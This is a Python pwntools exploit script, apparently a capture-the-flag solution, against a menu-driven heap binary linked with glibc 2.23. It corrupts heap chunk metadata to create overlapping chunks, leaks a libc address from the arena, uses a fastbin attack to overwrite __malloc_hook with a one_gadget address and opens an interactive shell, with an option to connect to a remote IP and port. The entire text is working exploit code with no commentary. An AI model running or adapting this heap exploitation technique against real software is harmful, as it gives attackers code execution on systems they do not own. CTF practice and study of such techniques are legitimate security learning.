from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./vuln"
libc_path = "/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6"


elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process([vuln_path])
    # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("1.95.36.136", 2116)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


def add(name, size, content):
    io.sendlineafter("Please Choice!", "1")
    io.sendlineafter("Please give me a name for item:", name)
    io.sendlineafter("Please Input Size:", str(size))
    io.sendlineafter("Content of Emo!:", content)


def edit(index, new_content):
    io.sendlineafter("Please Choice!", "3")
    io.sendlineafter("Please Input index:", str(index))
    io.sendlineafter("Change EMo Content", new_content)


def show(index):
    io.sendlineafter("Please Choice!", "4")
    io.sendlineafter("Please Input index:", str(index))


def delete(index):
    io.sendlineafter("Please Choice!", "2")
    io.sendlineafter("Please Input index:", str(index))


payload = b""
# io.sendline(payload)
add("t", 0xf8, "tttt")
add("t", 0xf8, "tttt")
add("t", 0xf8, "tttt")
add("t", 0xf8, "tttt")
delete(0)
edit(1, b"t"*0xf0+p64(0x200)+b"\x00")
delete(2)

add("t", 0xf8, "tttt")  # 0
show(1)

arena = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
libc.address = arena-0x3c4b78
log.success("libc.address: -----> " + hex(libc.address))
malloc_hook = libc.symbols["__malloc_hook"]

add("t", 0x68, "aaaa")  # chunksize -->0x70
delete(2)

edit(1, p64(malloc_hook-0x23))
add("t", 0x68, "bbbb")  # 2

one = libc.address + 0xf1247
add("t", 0x68, "tttt")  # 4
edit(4, b"t"*0x13+p64(one))

io.sendlineafter("Please Choice!", "1")
io.sendlineafter("Please give me a name for item:", "tinyfat")

io.interactive()
